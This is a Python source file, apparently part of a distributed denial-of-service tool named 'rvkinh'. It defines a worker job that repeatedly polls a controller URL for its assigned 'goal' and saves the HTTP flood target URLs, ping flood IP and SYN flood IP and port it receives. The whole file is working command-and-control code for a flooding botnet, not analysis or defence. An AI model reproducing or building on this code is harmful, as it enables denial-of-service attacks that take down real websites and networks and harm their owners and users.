import time
from injectable import injectable, autowired, Autowired
from tekleo_common_utils import UtilsEnv
from rvkinh_message_protocol import Worker
from rvkinh_utils import AbstractJob
from rvkinh_message_client import ClientController
from storage.storage_target import StorageTarget


@injectable
class JobControllerGetGoal(AbstractJob):
    @autowired
    def __init__(self,
                 storage_target: Autowired(StorageTarget),
                 client_controller: Autowired(ClientController),
                 utils_env: Autowired(UtilsEnv)
                 ):
        super().__init__()
        self.storage_target = storage_target
        self.client_controller = client_controller
        self.utils_env = utils_env
        self.utils_env.load_environment_variables(['CLUSTER_ID', 'WORKER_ID', 'CONTROLLER_URL'])
        self.cluster_id = self.utils_env.get_environment_variable('CLUSTER_ID')
        self.worker_id = self.utils_env.get_environment_variable('WORKER_ID')
        self.controller_url = self.utils_env.get_environment_variable('CONTROLLER_URL')
        self.worker = Worker(self.cluster_id, self.worker_id)

    def job_iteration(self):
        print('JobControllerGetGoal.job_iteration(): Started')

        # Try to get goal
        try:
            goal = self.client_controller.worker_goal_akio(self.controller_url, self.worker)
        except:
            # Sleep and return
            print('JobControllerGetGoal.job_iteration(): WARNING!!! Failed to retrieve goal from ' + str(self.controller_url))
            print('JobControllerGetGoal.job_iteration(): Sleeping...')
            time.sleep(30)
            print('JobControllerGetGoal.job_iteration(): Finished')
            return

        # Save goal
        self.storage_target.set_http_flood_target_urls(goal.http_flood_target_urls)
        self.storage_target.set_ping_flood_target_ip_address(goal.ping_flood_target_ip_address)
        self.storage_target.set_syn_flood_target_ip_address(goal.syn_flood_target_ip_address)
        self.storage_target.set_syn_flood_target_port(goal.syn_flood_target_port)

        # Sleep and return
        print('JobControllerGetGoal.job_iteration(): Retrieved goal ' + str(goal) + ' from ' + str(self.controller_url))
        print('JobControllerGetGoal.job_iteration(): Sleeping...')
        time.sleep(20)
        print('JobControllerGetGoal.job_iteration(): Finished')
